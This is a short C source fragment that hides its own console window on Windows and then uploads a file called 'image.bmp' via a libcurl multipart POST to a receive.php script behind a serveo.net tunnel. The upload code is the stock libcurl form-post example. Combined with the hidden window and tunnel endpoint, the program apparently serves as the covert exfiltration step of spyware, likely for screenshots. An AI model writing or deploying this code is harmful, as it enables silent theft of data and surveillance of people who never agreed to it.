

int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);


  CURL *curl;
  CURLcode res;
 
  curl_mime *form = NULL;
  curl_mimepart *field = NULL;
  struct curl_slist *headerlist = NULL;
  static const char buf[] = "Expect:";
 
  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  if(curl) {
    /* Create the form */ 
    form = curl_mime_init(curl);
 
    /* Fill in the file upload field */ 
    field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, "image.bmp");
 
    /* Fill in the submit field too, even if this is rarely needed */ 
    field = curl_mime_addpart(form);
    curl_mime_name(field, "submit");
    curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
 
    /* initialize custom header list (stating that Expect: 100-continue is not
       wanted */ 
    headerlist = curl_slist_append(headerlist, buf);
    /* what URL that receives this POST */ 

    curl_easy_setopt(curl, CURLOPT_URL, "http://serveo.net:serveo_port/receive.php");
   if((argc == 2) && (!strcmp(argv[1], "noexpectheader")))
      /* only disable 100-continue header if explicitly requested */ 
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
    /* Perform the request, res will get the return code */ 
    res = curl_easy_perform(curl);
    /* Check for errors */ 
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
 
    /* always cleanup */ 
    curl_easy_cleanup(curl);
 
    /* then cleanup the form */ 
    curl_mime_free(form);
    /* free slist */ 
    curl_slist_free_all(headerlist);
  exit(0);
  }

  return 0;
}

